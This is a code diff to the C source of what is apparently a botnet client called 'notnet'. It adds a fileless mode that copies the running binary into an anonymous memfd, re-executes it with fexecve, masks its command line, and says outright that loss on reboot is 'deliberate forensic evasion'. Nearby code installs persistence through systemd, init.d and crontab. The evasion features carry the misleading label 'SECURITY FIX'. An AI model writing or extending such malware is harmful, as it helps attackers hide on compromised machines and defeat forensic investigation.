@@ -11,6 +11,122 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <errno.h>
+#ifdef __linux__
+#include <sys/syscall.h>
+#endif
+
+/* ── Fileless / RAM-only Mode (SECURITY FIX #84) ──────────────── */
+/* MFD_CLOEXEC is a GNU extension; use the stable kernel ABI value (0x0001)
+ * so the build stays portable without _GNU_SOURCE. */
+#ifndef MFD_CLOEXEC
+#define MFD_CLOEXEC 0x0001U
+#endif
+
+extern char **environ;  /* passed through the fexecve self-relaunch */
+
+/* Returns 1 if this process is already running from an anonymous memfd
+ * (i.e. /proc/self/exe resolves to /memfd:...). On platforms without a
+ * readable /proc/self/exe we fail safe and report "already fileless" so
+ * the memfd relaunch can never loop. */
+static int already_fileless(void) {
+    char exe_path[64];
+    ssize_t n = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    if (n < 0) {
+        log_warn("Fileless: cannot read /proc/self/exe (%s) - skipping relaunch",
+                 strerror(errno));
+        return 1;
+    }
+    exe_path[n] = '\0';
+    return (strncmp(exe_path, "/memfd:", 7) == 0 ||
+            strstr(exe_path, " (deleted)") != NULL);
+}
+
+/* Linux-only: memfd_create() wrapper via raw syscall so no _GNU_SOURCE or
+ * glibc >= 2.27 is required. Returns the memfd, or -1 on failure. */
+static int memfd_create_wrap(const char *name, unsigned int flags) {
+#if defined(__linux__) && defined(SYS_memfd_create)
+    return (int)syscall(SYS_memfd_create, name, flags);
+#else
+    (void)name;
+    (void)flags;
+    errno = ENOSYS;
+    return -1;
+#endif
+}
+
+/* SECURITY FIX (#84): Fileless / RAM-resident operation mode.
+ * When persist_enabled=0 the bot must leave no disk-backed executable:
+ * copy the current image into an anonymous memfd and fexecve() it,
+ * replacing this process in place. On success this never returns. On any
+ * failure (no memfd_create, no /proc, fexecve error) we log and continue
+ * disk-backed — the bot must still function, it just skips persistence.
+ * Reboot-loss is deliberate forensic evasion, not a bug. */
+int persist_become_fileless(notnet_bot_t *bot) {
+    if (bot->persist_enabled) {
+        /* Normal mode: nothing to do here. */
+        return 0;
+    }
+
+    log_info("Persistence disabled (persist_enabled=0) - RAM-only fileless mode");
+
+    if (already_fileless()) {
+        log_info("Fileless: already running from anonymous memfd");
+        return 0;
+    }
+
+#ifdef __linux__
+    int fd = memfd_create_wrap("notnet", MFD_CLOEXEC);
+    if (fd < 0) {
+        log_warn("Fileless: memfd_create failed (%s) - continuing disk-backed",
+                 strerror(errno));
+        return -1;
+    }
+
+    /* Copy our own binary into the anonymous memory file. */
+    int src = open("/proc/self/exe", O_RDONLY);
+    if (src < 0) {
+        log_warn("Fileless: cannot open /proc/self/exe (%s) - continuing disk-backed",
+                 strerror(errno));
+        close(fd);
+        return -1;
+    }
+    char buf[8192];
+    ssize_t n;
+    while ((n = read(src, buf, sizeof(buf))) > 0) {
+        char *p = buf;
+        ssize_t rem = n;
+        while (rem > 0) {
+            ssize_t w = write(fd, p, (size_t)rem);
+            if (w <= 0) {
+                log_warn("Fileless: memfd write failed (%s) - continuing disk-backed",
+                         strerror(errno));
+                close(src);
+                close(fd);
+                return -1;
+            }
+            p += w;
+            rem -= w;
+        }
+    }
+    close(src);
+
+    /* init_bot() re-creates /tmp/notnet.lock with O_EXCL in the new image;
+     * drop the stale lock file now (we still hold it until the exec). */
+    unlink("/tmp/notnet.lock");
+
+    /* Replace the current image with the memfd copy. argv[0] is masked so
+     * /proc/<pid>/cmdline does not reveal the original disk path. */
+    char *argv[] = { "notnet", NULL };
+    fexecve(fd, argv, environ);
+    log_warn("Fileless: fexecve failed (%s) - continuing disk-backed",
+             strerror(errno));
+    close(fd);
+    return -1;
+#else
+    log_info("Fileless: platform lacks memfd_create, continuing disk-backed");
+    return 0;
+#endif
+}
 
 /* ── Init System Detection ────────────────────────────────── */
 int detect_init_system(void) {
@@ -241,6 +357,14 @@ int install_sysv(const char *bin_path) {
 
 /* ── Install Persistence ─────────────────────────────────── */
 int persist_install(notnet_bot_t *bot) {
+    /* SECURITY FIX (#84): persist_enabled=0 selects RAM-only fileless
+     * operation — persist_become_fileless() handles the memfd relaunch,
+     * here we simply refuse to install any launch point. */
+    if (!bot->persist_enabled) {
+        log_info("Persistence: skipped (persist_enabled=0, RAM-only mode)");
+        return 0;
+    }
+
     (void)bot;  /* reserved for future use (e.g. per-bot persistence config) */
     /* SECURITY FIX (#7): Only attempt persistence as root — otherwise
      * the writes to /etc/systemd/system, /etc/init.d, and crontab will
